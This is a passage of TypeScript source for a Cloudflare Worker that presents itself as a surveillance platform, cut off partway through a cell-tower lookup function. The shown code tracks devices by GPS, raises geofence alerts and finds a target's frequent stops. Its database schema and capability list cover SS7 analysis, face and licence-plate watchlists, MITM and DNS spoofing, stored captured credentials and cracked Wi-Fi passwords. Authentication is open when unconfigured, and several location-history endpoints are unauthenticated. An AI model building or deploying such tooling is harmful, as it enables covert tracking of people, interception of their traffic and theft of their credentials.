/**
 * ECHO PROMETHEUS SURVEILLANCE v2.0.0
 * Advanced Location Intelligence & Active Surveillance Platform
 * HARDENED + AUTONOMOUS + OPTIMIZED
 *
 * 6 Modules:
 *   1. GPS_TRACKER    - Real-time device GPS tracking with geofencing
 *   2. CELL_TOWER     - Cell tower triangulation (6-resolver cascade)
 *   3. CARRIER_INTEL  - SS7 analysis, SIM swap detection, CDR analysis
 *   4. PHYS_SURV      - IP cameras, ALPR, watchlists
 *   5. ACTIVE_INTERCEPT - MITM, WiFi, DNS intercept via Commander API tunnel
 *   6. IP_INTEL       - IP geolocation + threat intelligence (3-source cascade)
 *
 * Architecture: Cloudflare Worker (API + coordination) <-> Commander API tunnel <-> CHARLIE (Kali tools)
 */

import { Hono } from 'hono';
import { cors } from 'hono/cors';

type Bindings = {
  DB: D1Database;
  CACHE: KVNamespace;
  AI: any;
  BRAIN: Fetcher;
  ENGINES: Fetcher;
  SWARM: Fetcher;
  PROMETHEUS: Fetcher;
  PROMETHEUS_AI: Fetcher;
  OPENCELLID_API_KEY?: string;
  UNWIREDLABS_API_KEY?: string;
  GOOGLE_API_KEY?: string;
  NUMVERIFY_API_KEY?: string;
  TWILIO_SID?: string;
  TWILIO_AUTH?: string;
  TRACCAR_URL?: string;
  TRACCAR_TOKEN?: string;
  COMMANDER_API_URL?: string;
  ECHO_API_KEY?: string;
  CHARLIE_NODE?: string;
  PROMETHEUS_URL?: string;
};

const app = new Hono<{ Bindings: Bindings }>();
app.use('*', cors());

// ═══════════════════════════════════════════════════════════════
// STRUCTURED LOGGING
// ═══════════════════════════════════════════════════════════════

function log(level: string, message: string, data: Record<string, unknown> = {}) {
  console.log(JSON.stringify({
    ts: new Date().toISOString(),
    worker: 'echo-prometheus-surveillance',
    version: '2.0.0',
    level,
    message,
    ...data
  }));
}

// ═══════════════════════════════════════════════════════════════
// AUTH MIDDLEWARE
// ═══════════════════════════════════════════════════════════════

function requireAuth(c: any): Response | null {
  const key = c.req.header('X-Echo-API-Key') || c.req.header('Authorization')?.replace('Bearer ', '');
  const expected = c.env.ECHO_API_KEY;
  if (!expected) return null; // no key configured = open
  if (key !== expected) {
    log('warn', 'Auth failed', { ip: c.req.header('CF-Connecting-IP') });
    return c.json({ error: 'Unauthorized' }, 401);
  }
  return null;
}

// ═══════════════════════════════════════════════════════════════
// SCHEMA (20 tables + indexes)
// ═══════════════════════════════════════════════════════════════

const SCHEMA_STATEMENTS = [
  `CREATE TABLE IF NOT EXISTS tracked_devices (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT UNIQUE NOT NULL, device_name TEXT NOT NULL, device_type TEXT DEFAULT 'unknown', tracking_method TEXT DEFAULT 'gps', last_lat REAL, last_lon REAL, last_altitude REAL, last_speed REAL, last_heading REAL, last_accuracy REAL, last_battery REAL, last_signal_strength INTEGER, last_seen TEXT, status TEXT DEFAULT 'active', metadata TEXT DEFAULT '{}', created_at TEXT DEFAULT (datetime('now')), updated_at TEXT DEFAULT (datetime('now')))`,
  `CREATE TABLE IF NOT EXISTS location_history (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, lat REAL NOT NULL, lon REAL NOT NULL, altitude REAL, speed REAL, heading REAL, accuracy REAL, source TEXT DEFAULT 'gps', battery REAL, signal_strength INTEGER, cell_info TEXT, wifi_info TEXT, metadata TEXT DEFAULT '{}', timestamp TEXT DEFAULT (datetime('now')))`,
  `CREATE INDEX IF NOT EXISTS idx_loc_device ON location_history(device_id, timestamp DESC)`,
  `CREATE INDEX IF NOT EXISTS idx_loc_time ON location_history(timestamp DESC)`,
  `CREATE INDEX IF NOT EXISTS idx_loc_coords ON location_history(lat, lon)`,
  `CREATE TABLE IF NOT EXISTS geofences (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, fence_type TEXT DEFAULT 'circle', center_lat REAL, center_lon REAL, radius_meters REAL, polygon_coords TEXT, alert_on_enter INTEGER DEFAULT 1, alert_on_exit INTEGER DEFAULT 1, alert_on_dwell INTEGER DEFAULT 0, dwell_threshold_seconds INTEGER DEFAULT 300, assigned_devices TEXT DEFAULT '[]', active INTEGER DEFAULT 1, created_at TEXT DEFAULT (datetime('now')))`,
  `CREATE TABLE IF NOT EXISTS geofence_alerts (id INTEGER PRIMARY KEY AUTOINCREMENT, geofence_id INTEGER, device_id TEXT, alert_type TEXT, lat REAL, lon REAL, details TEXT DEFAULT '{}', acknowledged INTEGER DEFAULT 0, created_at TEXT DEFAULT (datetime('now')))`,
  `CREATE TABLE IF NOT EXISTS cell_tower_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, mcc INTEGER, mnc INTEGER, lac INTEGER, cell_id INTEGER, signal_strength INTEGER, timing_advance INTEGER, frequency INTEGER, radio_type TEXT DEFAULT 'gsm', resolved_lat REAL, resolved_lon REAL, resolved_accuracy REAL, resolver TEXT, raw_response TEXT, device_id TEXT, timestamp TEXT DEFAULT (datetime('now')))`,
  `CREATE INDEX IF NOT EXISTS idx_cell_tower ON cell_tower_logs(mcc, mnc, lac, cell_id)`,
  `CREATE INDEX IF NOT EXISTS idx_cell_device ON cell_tower_logs(device_id, timestamp DESC)`,
  `CREATE TABLE IF NOT EXISTS cell_tower_db (id INTEGER PRIMARY KEY AUTOINCREMENT, mcc INTEGER NOT NULL, mnc INTEGER NOT NULL, lac INTEGER NOT NULL, cell_id INTEGER NOT NULL, lat REAL, lon REAL, range_meters REAL, radio_type TEXT, carrier TEXT, country TEXT, region TEXT, samples INTEGER DEFAULT 1, last_updated TEXT DEFAULT (datetime('now')), UNIQUE(mcc, mnc, lac, cell_id))`,
  `CREATE TABLE IF NOT EXISTS carrier_intel (id INTEGER PRIMARY KEY AUTOINCREMENT, phone_number TEXT, imsi TEXT, imei TEXT, carrier TEXT, carrier_country TEXT, number_type TEXT, roaming_status TEXT, hlr_status TEXT, last_known_msc TEXT, last_known_vlr TEXT, sim_swap_detected INTEGER DEFAULT 0, sim_swap_date TEXT, port_history TEXT DEFAULT '[]', metadata TEXT DEFAULT '{}', last_queried TEXT DEFAULT (datetime('now')), created_at TEXT DEFAULT (datetime('now')))`,
  `CREATE INDEX IF NOT EXISTS idx_carrier_phone ON carrier_intel(phone_number)`,
  `CREATE INDEX IF NOT EXISTS idx_carrier_imsi ON carrier_intel(imsi)`,
  `CREATE TABLE IF NOT EXISTS ss7_analysis (id INTEGER PRIMARY KEY AUTOINCREMENT, operation TEXT NOT NULL, target_msisdn TEXT, target_imsi TEXT, source_gt TEXT, dest_gt TEXT, message_type TEXT, opcode TEXT, result TEXT, location_data TEXT, subscriber_data TEXT, risk_score REAL DEFAULT 0, anomaly_flags TEXT DEFAULT '[]', raw_packet TEXT, timestamp TEXT DEFAULT (datetime('now')))`,
  `CREATE TABLE IF NOT EXISTS cdr_records (id INTEGER PRIMARY KEY AUTOINCREMENT, calling_number TEXT, called_number TEXT, call_type TEXT, start_time TEXT, end_time TEXT, duration_seconds INTEGER, originating_cell TEXT, terminating_cell TEXT, originating_lat REAL, originating_lon REAL, terminating_lat REAL, terminating_lon REAL, imsi TEXT, imei TEXT, data_volume_bytes INTEGER, metadata TEXT DEFAULT '{}', imported_at TEXT DEFAULT (datetime('now')))`,
  `CREATE INDEX IF NOT EXISTS idx_cdr_calling ON cdr_records(calling_number, start_time DESC)`,
  `CREATE INDEX IF NOT EXISTS idx_cdr_called ON cdr_records(called_number, start_time DESC)`,
  `CREATE TABLE IF NOT EXISTS surveillance_cameras (id INTEGER PRIMARY KEY AUTOINCREMENT, camera_id TEXT UNIQUE NOT NULL, camera_name TEXT NOT NULL, camera_type TEXT DEFAULT 'ip_camera', protocol TEXT DEFAULT 'rtsp', stream_url TEXT, onvif_url TEXT, lat REAL, lon REAL, heading REAL, fov_degrees REAL, resolution TEXT, fps INTEGER DEFAULT 30, has_ptz INTEGER DEFAULT 0, has_ir INTEGER DEFAULT 0, has_audio INTEGER DEFAULT 0, recording_mode TEXT DEFAULT 'continuous', ai_detection_enabled INTEGER DEFAULT 0, detection_classes TEXT DEFAULT '["person","vehicle"]', status TEXT DEFAULT 'active', last_frame_at TEXT, metadata TEXT DEFAULT '{}', created_at TEXT DEFAULT (datetime('now')))`,
  `CREATE TABLE IF NOT EXISTS alpr_reads (id INTEGER PRIMARY KEY AUTOINCREMENT, plate_number TEXT NOT NULL, plate_state TEXT, plate_country TEXT DEFAULT 'US', confidence REAL, camera_id TEXT, lat REAL, lon REAL, vehicle_color TEXT, vehicle_make TEXT, vehicle_model TEXT, vehicle_year TEXT, vehicle_type TEXT, image_url TEXT, direction TEXT, speed_estimate REAL, on_watchlist INTEGER DEFAULT 0, watchlist_reason TEXT, timestamp TEXT DEFAULT (datetime('now')))`,
  `CREATE INDEX IF NOT EXISTS idx_alpr_plate ON alpr_reads(plate_number, timestamp DESC)`,
  `CREATE INDEX IF NOT EXISTS idx_alpr_camera ON alpr_reads(camera_id, timestamp DESC)`,
  `CREATE TABLE IF NOT EXISTS plate_watchlist (id INTEGER PRIMARY KEY AUTOINCREMENT, plate_number TEXT UNIQUE NOT NULL, reason TEXT NOT NULL, priority TEXT DEFAULT 'medium', alert_telegram INTEGER DEFAULT 1, alert_sms INTEGER DEFAULT 0, notes TEXT, active INTEGER DEFAULT 1, created_at TEXT DEFAULT (datetime('now')))`,
  `CREATE TABLE IF NOT EXISTS person_watchlist (id INTEGER PRIMARY KEY AUTOINCREMENT, identity_name TEXT NOT NULL, face_encodings TEXT DEFAULT '[]', description TEXT, priority TEXT DEFAULT 'medium', alert_telegram INTEGER DEFAULT 1, alert_sms INTEGER DEFAULT 0, reference_images TEXT DEFAULT '[]', notes TEXT, active INTEGER DEFAULT 1, created_at TEXT DEFAULT (datetime('now')))`,
  `CREATE TABLE IF NOT EXISTS intercept_sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, session_id TEXT UNIQUE NOT NULL, session_type TEXT NOT NULL, target TEXT, interface TEXT, node TEXT DEFAULT 'charlie', status TEXT DEFAULT 'active', packets_captured INTEGER DEFAULT 0, bytes_captured INTEGER DEFAULT 0, interesting_packets INTEGER DEFAULT 0, filter_expression TEXT, output_file TEXT, start_time TEXT DEFAULT (datetime('now')), end_time TEXT, metadata TEXT DEFAULT '{}')`,
  `CREATE TABLE IF NOT EXISTS captured_credentials (id INTEGER PRIMARY KEY AUTOINCREMENT, session_id TEXT, protocol TEXT, source_ip TEXT, source_port INTEGER, dest_ip TEXT, dest_port INTEGER, username TEXT, credential_hash TEXT, credential_type TEXT, service TEXT, url TEXT, raw_data TEXT, timestamp TEXT DEFAULT (datetime('now')))`,
  `CREATE INDEX IF NOT EXISTS idx_cred_session ON captured_credentials(session_id)`,
  `CREATE TABLE IF NOT EXISTS dns_intercepts (id INTEGER PRIMARY KEY AUTOINCREMENT, session_id TEXT, query_domain TEXT NOT NULL, query_type TEXT DEFAULT 'A', original_response TEXT, spoofed_response TEXT, source_ip TEXT, action TEXT DEFAULT 'log', timestamp TEXT DEFAULT (datetime('now')))`,
  `CREATE INDEX IF NOT EXISTS idx_dns_domain ON dns_intercepts(query_domain, timestamp DESC)`,
  `CREATE TABLE IF NOT EXISTS wifi_networks (id INTEGER PRIMARY KEY AUTOINCREMENT, bssid TEXT NOT NULL, ssid TEXT, channel INTEGER, frequency INTEGER, signal_strength INTEGER, encryption TEXT, cipher TEXT, auth TEXT, wps INTEGER DEFAULT 0, clients_count INTEGER DEFAULT 0, lat REAL, lon REAL, first_seen TEXT DEFAULT (datetime('now')), last_seen TEXT DEFAULT (datetime('now')), handshake_captured INTEGER DEFAULT 0, pmkid_captured INTEGER DEFAULT 0, cracked INTEGER DEFAULT 0, password TEXT, metadata TEXT DEFAULT '{}')`,
  `CREATE INDEX IF NOT EXISTS idx_wifi_bssid ON wifi_networks(bssid)`,
  `CREATE INDEX IF NOT EXISTS idx_wifi_ssid ON wifi_networks(ssid)`,
  `CREATE TABLE IF NOT EXISTS wifi_clients (id INTEGER PRIMARY KEY AUTOINCREMENT, mac_address TEXT NOT NULL, associated_bssid TEXT, probe_requests TEXT DEFAULT '[]', signal_strength INTEGER, packets INTEGER DEFAULT 0, data_bytes INTEGER DEFAULT 0, manufacturer TEXT, device_name TEXT, first_seen TEXT DEFAULT (datetime('now')), last_seen TEXT DEFAULT (datetime('now')))`,
  `CREATE INDEX IF NOT EXISTS idx_wifi_client_mac ON wifi_clients(mac_address)`,
  `CREATE TABLE IF NOT EXISTS surveillance_log (id INTEGER PRIMARY KEY AUTOINCREMENT, module TEXT NOT NULL, action TEXT NOT NULL, target TEXT, result TEXT, details TEXT DEFAULT '{}', operator TEXT DEFAULT 'system', timestamp TEXT DEFAULT (datetime('now')))`,
  `CREATE INDEX IF NOT EXISTS idx_surv_log ON surveillance_log(module, timestamp DESC)`,
  `CREATE TABLE IF NOT EXISTS ip_intel (id INTEGER PRIMARY KEY AUTOINCREMENT, ip_address TEXT NOT NULL, lat REAL, lon REAL, city TEXT, region TEXT, country TEXT, isp TEXT, org TEXT, asn TEXT, reverse_dns TEXT, is_proxy INTEGER DEFAULT 0, is_vpn INTEGER DEFAULT 0, is_tor INTEGER DEFAULT 0, is_hosting INTEGER DEFAULT 0, is_mobile INTEGER DEFAULT 0, threat_score REAL DEFAULT 0, raw_data TEXT, last_queried TEXT DEFAULT (datetime('now')), UNIQUE(ip_address))`,
  `CREATE INDEX IF NOT EXISTS idx_ip_address ON ip_intel(ip_address)`,
  `CREATE INDEX IF NOT EXISTS idx_ip_threat ON ip_intel(threat_score DESC)`,
  `CREATE INDEX IF NOT EXISTS idx_ip_geo ON ip_intel(lat, lon)`,
];

// ═══════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════

function haversine(lat1: number, lon1: number, lat2: number, lon2: number): number {
  const R = 6371000;
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat / 2) ** 2 + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon / 2) ** 2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

async function logAction(db: D1Database, module: string, action: string, target: string, result: string, details: Record<string, unknown> = {}) {
  try {
    await db.prepare('INSERT INTO surveillance_log (module, action, target, result, details) VALUES (?, ?, ?, ?, ?)').bind(module, action, target, result, JSON.stringify(details)).run();
  } catch { /* non-critical */ }
}

async function checkGeofences(db: D1Database, deviceId: string, lat: number, lon: number, env: Bindings) {
  try {
    const fences = await db.prepare('SELECT * FROM geofences WHERE active = 1').all();
    for (const fence of fences.results || []) {
      const devices = JSON.parse((fence.assigned_devices as string) || '[]');
      if (devices.length > 0 && !devices.includes(deviceId)) continue;
      if (fence.fence_type === 'circle' && fence.center_lat && fence.center_lon && fence.radius_meters) {
        const dist = haversine(lat, lon, fence.center_lat as number, fence.center_lon as number);
        const inside = dist <= (fence.radius_meters as number);
        // Check previous state from last location
        const prev = await db.prepare('SELECT lat, lon FROM location_history WHERE device_id = ? ORDER BY timestamp DESC LIMIT 1 OFFSET 1').bind(deviceId).first();
        if (prev) {
          const wasInside = haversine(prev.lat as number, prev.lon as number, fence.center_lat as number, fence.center_lon as number) <= (fence.radius_meters as number);
          if (inside && !wasInside && fence.alert_on_enter) {
            await db.prepare('INSERT INTO geofence_alerts (geofence_id, device_id, alert_type, lat, lon, details) VALUES (?, ?, ?, ?, ?, ?)').bind(fence.id, deviceId, 'enter', lat, lon, JSON.stringify({ fence_name: fence.name, distance: Math.round(dist) })).run();
            log('info', 'Geofence ENTER alert', { device: deviceId, fence: fence.name });
          } else if (!inside && wasInside && fence.alert_on_exit) {
            await db.prepare('INSERT INTO geofence_alerts (geofence_id, device_id, alert_type, lat, lon, details) VALUES (?, ?, ?, ?, ?, ?)').bind(fence.id, deviceId, 'exit', lat, lon, JSON.stringify({ fence_name: fence.name, distance: Math.round(dist) })).run();
            log('info', 'Geofence EXIT alert', { device: deviceId, fence: fence.name });
          }
        }
      }
    }
  } catch (e) { log('warn', 'Geofence check failed', { error: String(e) }); }
}

function identifyCarrier(mcc: number, mnc: number): { carrier: string; country: string } {
  const key = `${mcc}-${mnc}`;
  const carriers: Record<string, { carrier: string; country: string }> = {
    '310-410': { carrier: 'AT&T', country: 'US' }, '310-260': { carrier: 'T-Mobile', country: 'US' },
    '311-480': { carrier: 'Verizon', country: 'US' }, '310-120': { carrier: 'Sprint/T-Mobile', country: 'US' },
    '310-030': { carrier: 'AT&T (CingularWireless)', country: 'US' }, '312-530': { carrier: 'Sprint', country: 'US' },
    '310-150': { carrier: 'AT&T', country: 'US' }, '311-490': { carrier: 'T-Mobile/Sprint', country: 'US' },
    '310-580': { carrier: 'T-Mobile (MetroPCS)', country: 'US' },
    // Permian Basin local
    '310-770': { carrier: 'i wireless', country: 'US' }, '311-040': { carrier: 'Commnet Wireless', country: 'US' },
    '312-420': { carrier: 'Nex-Tech', country: 'US' },
  };
  return carriers[key] || { carrier: `Unknown (${mcc}/${mnc})`, country: mcc === 310 || mcc === 311 || mcc === 312 ? 'US' : 'Unknown' };
}

function weightedTriangulation(towers: Array<{ lat: number; lon: number; signal: number; accuracy?: number }>): { lat: number; lon: number; accuracy: number } {
  if (towers.length === 0) return { lat: 0, lon: 0, accuracy: 99999 };
  if (towers.length === 1) return { lat: towers[0].lat, lon: towers[0].lon, accuracy: towers[0].accuracy || 1000 };
  let totalWeight = 0;
  let wLat = 0, wLon = 0;
  for (const t of towers) {
    const w = Math.pow(10, (t.signal + 110) / 20); // signal dBm to linear weight
    wLat += t.lat * w;
    wLon += t.lon * w;
    totalWeight += w;
  }
  const avgAcc = towers.reduce((s, t) => s + (t.accuracy || 500), 0) / towers.length;
  return { lat: wLat / totalWeight, lon: wLon / totalWeight, accuracy: Math.round(avgAcc * 0.7) };
}

async function cacheTower(db: D1Database, mcc: number, mnc: number, lac: number, cellId: number, lat: number, lon: number, radio: string) {
  try {
    const info = identifyCarrier(mcc, mnc);
    await db.prepare('INSERT OR REPLACE INTO cell_tower_db (mcc, mnc, lac, cell_id, lat, lon, radio_type, carrier, country, last_updated) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, datetime(\'now\'))').bind(mcc, mnc, lac, cellId, lat, lon, radio, info.carrier, info.country).run();
  } catch { /* non-critical */ }
}

async function analyzeMovementPatterns(db: D1Database, deviceId: string, ai: any) {
  const cutoff = new Date(Date.now() - 7 * 86400000).toISOString();
  const locations = await db.prepare('SELECT lat, lon, speed, timestamp FROM location_history WHERE device_id = ? AND timestamp > ? ORDER BY timestamp ASC').bind(deviceId, cutoff).all();
  if (!locations.results?.length) return { patterns: [], frequentStops: [] };
  // Cluster frequent stops (speed < 2 m/s, within 100m)
  const stops: Array<{ lat: number; lon: number; count: number; firstSeen: string; lastSeen: string }> = [];
  for (const loc of locations.results) {
    if ((loc.speed as number) > 2) continue;
    const existing = stops.find(s => haversine(s.lat, s.lon, loc.lat as number, loc.lon as number) < 100);
    if (existing) {
      existing.count++;
      existing.lastSeen = loc.timestamp as string;
    } else {
      stops.push({ lat: loc.lat as number, lon: loc.lon as number, count: 1, firstSeen: loc.timestamp as string, lastSeen: loc.timestamp as string });
    }
  }
  return {
    total_locations: locations.results.length,
    frequentStops: stops.filter(s => s.count >= 3).sort((a, b) => b.count - a.count).slice(0, 20),
    period_days: 7
  };
}

// ═══════════════════════════════════════════════════════════════
// HEALTH & INIT
// ═══════════════════════════════════════════════════════════════

app.get("/", (c) => c.json({ service: 'echo-prometheus-surveillance', status: 'operational' }));

app.get('/health', async (c) => {
  const db = c.env.DB;
  let dbStatus = 'unknown';
  const stats: Record<string, unknown> = {};
  try {
    const [devices, towers, intercepts, cameras, alerts24h, ips] = await Promise.all([
      db.prepare('SELECT COUNT(*) as cnt FROM tracked_devices').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM cell_tower_logs').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM intercept_sessions').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM surveillance_cameras').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM geofence_alerts WHERE created_at > ?').bind(new Date(Date.now() - 86400000).toISOString()).first(),
      db.prepare('SELECT COUNT(*) as cnt FROM ip_intel').first(),
    ]);
    dbStatus = 'connected';
    stats.tracked_devices = devices?.cnt || 0;
    stats.tower_lookups = towers?.cnt || 0;
    stats.intercept_sessions = intercepts?.cnt || 0;
    stats.cameras = cameras?.cnt || 0;
    stats.alerts_24h = alerts24h?.cnt || 0;
    stats.ips_tracked = ips?.cnt || 0;
  } catch (e) { dbStatus = 'initializing'; log('warn', 'Health DB query failed', { error: String(e) }); }

  return c.json({
    status: 'healthy', worker: 'echo-prometheus-surveillance', version: '2.0.0',
    codename: 'ARGUS PANOPTES', timestamp: new Date().toISOString(),
    database: dbStatus, stats,
    modules: { gps_tracker: 'active', cell_tower: 'active', carrier_intel: 'active', phys_surveillance: 'active', active_intercept: 'active', ip_intelligence: 'active' },
    capabilities: [
      'Real-time GPS device tracking', 'Cell tower triangulation (6-resolver cascade)',
      'Carrier-level location intelligence', 'SS7/Diameter protocol analysis',
      'SIM swap detection', 'CDR pattern analysis', 'IP camera RTSP integration',
      'License plate recognition (ALPR)', 'Geofencing with real-time alerts',
      'MITM proxy management via Commander API', 'WiFi monitoring',
      'DNS interception', 'Multi-device fleet tracking', 'Historical location playback',
      'Predictive movement analysis', 'IP geolocation (3 free providers)',
      'IP threat intelligence', 'Bulk IP lookup (100/batch)',
      'Autonomous patrol mode', 'Cross-module unified search'
    ]
  });
});

app.get('/init', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  try {
    await db.batch(SCHEMA_STATEMENTS.map(s => db.prepare(s)));
    return c.json({ success: true, message: 'ARGUS PANOPTES v2.0.0 initialized — 20 tables ready', tables: 20, statements: SCHEMA_STATEMENTS.length });
  } catch (e: any) {
    return c.json({ success: false, error: e.message }, 500);
  }
});

// ═══════════════════════════════════════════════════════════════
// MODULE 1: REAL-TIME GPS TRACKING
// ═══════════════════════════════════════════════════════════════

app.post('/gps/devices', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { device_id, device_name, device_type, tracking_method, metadata } = body;
  if (!device_id || !device_name) return c.json({ error: 'device_id and device_name required' }, 400);
  try {
    await db.prepare('INSERT INTO tracked_devices (device_id, device_name, device_type, tracking_method, metadata) VALUES (?, ?, ?, ?, ?)').bind(device_id, device_name, device_type || 'unknown', tracking_method || 'gps', JSON.stringify(metadata || {})).run();
    await logAction(db, 'gps_tracker', 'device_registered', device_id, 'success', { device_name, device_type });
    return c.json({ success: true, device_id });
  } catch (e: any) {
    return c.json({ error: e.message }, 500);
  }
});

app.get('/gps/devices', async (c) => {
  const db = c.env.DB;
  const status = c.req.query('status') || 'active';
  const devices = await db.prepare('SELECT * FROM tracked_devices WHERE status = ? ORDER BY last_seen DESC').bind(status).all();
  return c.json({ devices: devices.results || [] });
});

app.post('/gps/location', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { device_id, lat, lon, altitude, speed, heading, accuracy, battery, signal_strength, source, cell_info, wifi_info } = body;
  if (!device_id || lat == null || lon == null) return c.json({ error: 'device_id, lat, lon required' }, 400);
  try {
    await db.prepare('INSERT INTO location_history (device_id, lat, lon, altitude, speed, heading, accuracy, source, battery, signal_strength, cell_info, wifi_info) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(device_id, lat, lon, altitude || null, speed || null, heading || null, accuracy || null, source || 'gps', battery || null, signal_strength || null, cell_info ? JSON.stringify(cell_info) : null, wifi_info ? JSON.stringify(wifi_info) : null).run();
    await db.prepare('UPDATE tracked_devices SET last_lat = ?, last_lon = ?, last_altitude = ?, last_speed = ?, last_heading = ?, last_accuracy = ?, last_battery = ?, last_signal_strength = ?, last_seen = datetime(\'now\'), updated_at = datetime(\'now\') WHERE device_id = ?').bind(lat, lon, altitude || null, speed || null, heading || null, accuracy || null, battery || null, signal_strength || null, device_id).run();
    // Check geofences asynchronously
    checkGeofences(db, device_id, lat, lon, c.env);
    return c.json({ success: true, device_id, lat, lon });
  } catch (e: any) {
    return c.json({ error: e.message }, 500);
  }
});

// Traccar webhook (OsmAnd format)
app.get('/gps/traccar', async (c) => {
  const db = c.env.DB;
  const { id, lat, lon, altitude, speed, bearing, accuracy, batt, timestamp } = c.req.query();
  if (!id || !lat || !lon) return c.json({ error: 'id, lat, lon required' }, 400);
  try {
    await db.prepare('INSERT INTO location_history (device_id, lat, lon, altitude, speed, heading, accuracy, battery, source) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(id, parseFloat(lat), parseFloat(lon), altitude ? parseFloat(altitude) : null, speed ? parseFloat(speed) : null, bearing ? parseFloat(bearing) : null, accuracy ? parseFloat(accuracy) : null, batt ? parseFloat(batt) : null, 'traccar').run();
    await db.prepare('UPDATE tracked_devices SET last_lat = ?, last_lon = ?, last_speed = ?, last_seen = datetime(\'now\') WHERE device_id = ?').bind(parseFloat(lat), parseFloat(lon), speed ? parseFloat(speed) : null, id).run();
    return c.text('OK');
  } catch (e: any) {
    return c.json({ error: e.message }, 500);
  }
});

app.get('/gps/history/:deviceId', async (c) => {
  const db = c.env.DB;
  const deviceId = c.req.param('deviceId');
  const hours = Math.min(parseInt(c.req.query('hours') || '24'), 720);
  const cutoff = new Date(Date.now() - hours * 3600000).toISOString();
  const history = await db.prepare('SELECT * FROM location_history WHERE device_id = ? AND timestamp > ? ORDER BY timestamp DESC LIMIT 1000').bind(deviceId, cutoff).all();
  return c.json({ device_id: deviceId, hours, points: history.results?.length || 0, history: history.results || [] });
});

app.get('/gps/live', async (c) => {
  const db = c.env.DB;
  const cutoff = new Date(Date.now() - 300000).toISOString(); // 5 min
  const devices = await db.prepare('SELECT * FROM tracked_devices WHERE last_seen > ? AND status = ? ORDER BY last_seen DESC').bind(cutoff, 'active').all();
  return c.json({ live_devices: devices.results || [], count: devices.results?.length || 0 });
});

app.post('/gps/analyze/:deviceId', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const patterns = await analyzeMovementPatterns(c.env.DB, c.req.param('deviceId'), c.env.AI);
  return c.json({ device_id: c.req.param('deviceId'), analysis: patterns });
});

// ═══════════════════════════════════════════════════════════════
// GEOFENCING
// ═══════════════════════════════════════════════════════════════

app.post('/geofences', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { name, center_lat, center_lon, radius_meters, alert_on_enter, alert_on_exit, assigned_devices } = body;
  if (!name || center_lat == null || center_lon == null) return c.json({ error: 'name, center_lat, center_lon required' }, 400);
  await db.prepare('INSERT INTO geofences (name, center_lat, center_lon, radius_meters, alert_on_enter, alert_on_exit, assigned_devices) VALUES (?, ?, ?, ?, ?, ?, ?)').bind(name, center_lat, center_lon, radius_meters || 500, alert_on_enter ?? 1, alert_on_exit ?? 1, JSON.stringify(assigned_devices || [])).run();
  await logAction(db, 'geofence', 'created', name, 'success', { center_lat, center_lon, radius_meters });
  return c.json({ success: true, name });
});

app.get('/geofences', async (c) => {
  const fences = await c.env.DB.prepare('SELECT * FROM geofences WHERE active = 1 ORDER BY created_at DESC').all();
  return c.json({ geofences: fences.results || [] });
});

app.delete('/geofences/:id', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  await c.env.DB.prepare('UPDATE geofences SET active = 0 WHERE id = ?').bind(parseInt(c.req.param('id'))).run();
  return c.json({ success: true });
});

app.get('/geofences/alerts', async (c) => {
  const hours = Math.min(parseInt(c.req.query('hours') || '24'), 720);
  const cutoff = new Date(Date.now() - hours * 3600000).toISOString();
  const alerts = await c.env.DB.prepare('SELECT ga.*, g.name as fence_name FROM geofence_alerts ga LEFT JOIN geofences g ON ga.geofence_id = g.id WHERE ga.created_at > ? ORDER BY ga.created_at DESC LIMIT 500').bind(cutoff).all();
  return c.json({ alerts: alerts.results || [] });
});

// ═══════════════════════════════════════════════════════════════
// MODULE 2: CELL TOWER INTELLIGENCE
// ═══════════════════════════════════════════════════════════════

async function resolveCellTower(env: Bindings, db: D1Database, mcc: number, mnc: number, lac: number, cellId: number, radio: string = 'gsm', signal: number = -70): Promise<{ lat: number; lon: number; accuracy: number; resolver: string } | null> {
  // 1. D1 cache
  const cached = await db.prepare('SELECT lat, lon, range_meters FROM cell_tower_db WHERE mcc = ? AND mnc = ? AND lac = ? AND cell_id = ?').bind(mcc, mnc, lac, cellId).first();
  if (cached?.lat) return { lat: cached.lat as number, lon: cached.lon as number, accuracy: (cached.range_meters as number) || 500, resolver: 'cache' };

  // 2. OpenCelliD
  if (env.OPENCELLID_API_KEY) {
    try {
      const r = await fetch(`https://opencellid.org/cell/get?key=${env.OPENCELLID_API_KEY}&mcc=${mcc}&mnc=${mnc}&lac=${lac}&cellid=${cellId}&format=json`);
      if (r.ok) { const d: any = await r.json(); if (d.lat) { await cacheTower(db, mcc, mnc, lac, cellId, d.lat, d.lon, radio); return { lat: d.lat, lon: d.lon, accuracy: d.range || 500, resolver: 'opencellid' }; } }
    } catch { /* fallthrough */ }
  }

  // 3. UnwiredLabs
  if (env.UNWIREDLABS_API_KEY) {
    try {
      const r = await fetch('https://us1.unwiredlabs.com/v2/process', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: env.UNWIREDLABS_API_KEY, radio, mcc, mnc, cells: [{ lac, cid: cellId, signal }] }) });
